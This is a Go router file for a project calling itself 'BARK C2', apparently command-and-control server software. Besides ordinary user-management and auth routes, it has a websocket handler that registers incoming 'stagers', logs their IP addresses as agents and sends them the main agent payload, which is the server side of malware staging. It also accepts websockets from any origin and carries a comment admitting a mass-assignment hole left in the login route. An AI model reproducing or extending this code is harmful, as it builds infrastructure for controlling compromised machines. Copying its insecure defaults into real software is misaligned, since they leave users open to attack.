package router

import (
	"net/http"

	"encoding/json"
	"time"

	"github.com/Et43/BARK/agent"
	"github.com/Et43/BARK/config"
	"github.com/Et43/BARK/database/dao"
	"github.com/Et43/BARK/middleware"
	"github.com/casbin/casbin/v2"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

func InitRouter(init *config.Initialization) *gin.Engine {
	router := gin.New()
	router.Use(gin.Logger())
	router.Use(gin.Recovery())

	router.Static("/static", "./static")

	templates := []string{
		"templates/**/*",
	}

	for _, pattern := range templates {
		router.LoadHTMLGlob(pattern)
	}

	// Fix the path to your model file
	enforcer, err := casbin.NewEnforcer("config/casbin/RESTful_model.conf", "config/casbin/policy.csv")
	if err != nil {
		panic(err)
	}

	// Define your policies
	enforcer.AddPolicy("admin", "/api/user", "GET")
	enforcer.AddPolicy("admin", "/api/user", "POST")
	enforcer.AddPolicy("admin", "/api/user", "PUT")
	enforcer.AddPolicy("admin", "/api/user", "DELETE")
	enforcer.AddPolicy("user", "/api/user", "GET")

	// Save the policy back to the file
	enforcer.SavePolicy()

	// Create authorization middleware
	authz := AuthMiddleware(enforcer)

	/*
	* API authentication routes
	*
	* /api/auth/login POST - Login route TODO: REMOVE MASS ASSIGNMENT VULN ()
	* /api/auth/register POST - Register route
	 */
	auth := router.Group("/api/auth")
	{
		auth.POST("/login", init.AuthCtrl.Login)
		auth.POST("/register", init.AuthCtrl.Register)
	}

	/*
	*  API user management routes
	*  All routes in this group require a valid JWT token
	*  and are protected by Casbin authorization middleware
	*
	*  /api/user GET - Get all users (admin only) or show the current users data (normal useage))
	*  /api/user POST - Add a new user (admin only)
	*  /api/user/:userID GET - Get a user by ID (admin only)
	*  /api/user/:userID PUT - Update a user by ID (admin only)
	 */
	api := router.Group("/api")
	api.Use(middleware.JWTAuth()) // Apply JWT authentication to all API routes
	{
		// Apply Casbin authorization middleware to user group
		user := api.Group("/user", authz)
		user.GET("", init.UserCtrl.GetAllUserData)
		user.POST("", init.UserCtrl.AddUserData)
		user.GET("/:userID", init.UserCtrl.GetUserById)
		user.PUT("/:userID", init.UserCtrl.UpdateUserData)
		user.DELETE("/:userID", init.UserCtrl.DeleteUser)
	}

	/*
	* CORE routes
	*
	*	/ GET - Index route
	 */
	router.GET("/", func(c *gin.Context) {
		// Default values for stats if user is not authenticated
		stats := gin.H{
			"sessions": 0,
			"clients":  0,
		}

		c.HTML(200, "base.tmpl", gin.H{
			"message": "Welcome to BARK C2",
			"stats":   stats,
		})
	})

	/*
	* AGENT routes
	*
	 */
	agentRoute := router.Group("/agents")
	agentRoute.GET("", init.AgentCtrl.GetAgents)
	agentRoute.GET("/:agentID", init.AgentCtrl.GetAgentByID)
	agentRoute.GET("/stagers", init.AgentCtrl.GetStagers)

	/*
	* WEBSOCKET routes
	*
	* /ws GET - Websocket route
	 */
	router.GET("/ws", func(c *gin.Context) {
		conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
		println("Connection requested")
		if err != nil {
			println(err.Error())
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		defer conn.Close()

		for {
			_, msg, err := conn.ReadMessage()
			if err != nil {
				println("Error reading message: ", err.Error())
				return
			}

			var message map[string]interface{}
			if err := json.Unmarshal(msg, &message); err != nil {
				// Not JSON, treat as plain text
				println("Received non-JSON message: %s", string(msg))
				continue
			}

			// Check if it's a stager registration
			messageType, ok := message["type"].(string)
			if ok && messageType == "stager_registration" {
				println("Agent stager connected: ", message["agentId"].(string))

				agentPayload := agent.GetAgentPayload()
				//systemInfo, _ := json.Marshal(message["systemInfo"])

				newAgent := &dao.Agent{
					Name:     message["agentId"].(string),
					SourceIP: c.ClientIP(),
					IsStager: true,
				}

				init.AgentCtrl.CreateAgent(newAgent)

				// If CreateAgent has internal error handling, no need to check for err here
				println("Agent created successfully")

				// Send back the agent payload
				payload := map[string]interface{}{
					"type":      "agent_payload",
					"timestamp": time.Now().Format(time.RFC3339),
					"payload":   agentPayload,
				}

				payloadJson, _ := json.Marshal(payload)
				if err := conn.WriteMessage(websocket.TextMessage, payloadJson); err != nil {
					println("Error sending payload: ", err.Error())
					return
				}

				println("Main agent payload sent to stager: ", message["agentId"].(string))
			} else if ok && messageType == "payload_received" {
				println("Agent confirmed payload receipt: ", message["type"].(string), message["status"].(string))
			} else {
				// Handle other message types
				println("Received message: %v", message)

				// Echo the message back
				if err := conn.WriteMessage(websocket.TextMessage, msg); err != nil {
					println("Error echoing message: ", err.Error())
					return
				}
			}
		}
	})

	return router
}

// AuthMiddleware returns a Gin middleware for Casbin authorization
func AuthMiddleware(enforcer *casbin.Enforcer) gin.HandlerFunc {
	return func(c *gin.Context) {
		// Get current user role from context (set by JWT middleware)
		role, exists := c.Get("userRole")
		if !exists {
			c.AbortWithStatusJSON(401, gin.H{"error": "Unauthorized, no role found"})
			return
		}

		path := c.Request.URL.Path
		method := c.Request.Method

		// Check if the user has permission
		allowed, err := enforcer.Enforce(role, path, method)
		if err != nil {
			c.AbortWithStatusJSON(500, gin.H{"error": "Authorization error"})
			return
		}

		if !allowed {
			c.AbortWithStatusJSON(403, gin.H{"error": "Forbidden"})
			return
		}

		c.Next()
	}
}
